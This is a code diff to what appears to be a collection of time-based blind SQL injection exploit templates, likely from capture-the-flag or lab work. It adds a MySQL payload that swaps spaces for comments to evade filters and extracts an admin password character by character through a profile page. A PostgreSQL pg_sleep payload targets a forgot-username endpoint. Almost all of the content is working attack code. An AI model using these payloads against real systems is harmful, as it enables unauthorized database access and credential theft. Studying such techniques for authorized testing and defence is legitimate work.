@@ -32,7 +32,7 @@ Example - time-based blind SQLi on PostgreSQL:
     secret = extract_string_blind(is_correct_char, length=32, label="admin token")
     print(secret)
 
-    OR..
+    OR FOR POSTGRES SQLi..
     def stage1_sqli(base_url: str) -> None:
         def is_correct_char_username(index: int, char: str) -> bool:
             payload = f\"\"\"admin'; SELECT CASE WHEN (substr((SELECT username FROM users LIMIT 1 OFFSET 0), {index}, 1) = $${char}$$) THEN pg_sleep(3) ELSE pg_sleep(0) END; --\"\"\"
@@ -40,7 +40,17 @@ Example - time-based blind SQLi on PostgreSQL:
             session.post(f"{base_url}/forgotusername.php", data={"username": payload})
             return time.time() - start >= 3
         secret = extract_string_blind(is_correct_char_username, length=32, label="username")
-        
+    
+    OR FOR MYSQLi:
+        def is_correct_char_username(index: int, char: str) -> bool:
+        payload = f\"\"\"7 OR (SELECT CASE WHEN (BINARY SUBSTR((SELECT username FROM users LIMIT 1 OFFSET 0), {index}, 1) = '{char}') THEN sleep(1) ELSE sleep(0) END);\"\"\"
+        final_payload = payload.replace(" ", "/**/")
+        start = time.time()
+        session.get(f"{base_url}/pages/profile.php?user_id=14&receiver_id={final_payload}", proxies=BURP_PROXIES)
+        return time.time() - start >= 4
+    admin_password = extract_string_blind(is_correct_char_username, length=32, label="username").rstrip("?")
+    print_ok(f"Admin password obtained through SQLi: {admin_password}")
+
 
     OR with offset...
     def stage1_sqli(base_url: str) -> None:
@@ -78,7 +88,7 @@ def extract_string_blind(
     check_fn,
     length: int,
     charset: str = string.ascii_letters + string.digits + string.punctuation,
-    max_workers: int = 30,
+    max_workers: int = 10,
     label: str = "value",
 ) -> str:
     """
